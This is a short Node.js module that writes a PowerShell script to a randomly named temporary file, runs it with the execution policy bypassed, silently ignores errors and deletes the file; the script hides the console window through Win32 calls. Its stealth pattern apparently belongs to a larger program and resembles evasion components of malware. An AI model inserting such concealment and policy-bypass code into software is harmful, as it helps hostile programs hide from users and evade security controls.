const child_process = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

const program = require('./../../utils/program/program.js');

module.exports = async () => {
    const powershellScript = `
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '

        $consoleHandle = [Console.Window]::GetConsoleWindow()
        [Console.Window]::ShowWindow($consoleHandle, 0)
    `;

    const tempFile = path.join(os.tmpdir(), `${program.RandString(10)}.ps1`);
    fs.writeFileSync(tempFile, powershellScript);
    
    try {
        child_process.execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempFile}"`, { stdio: 'inherit' });
    } catch (error) {
    } finally {
        fs.unlinkSync(tempFile);
    }
};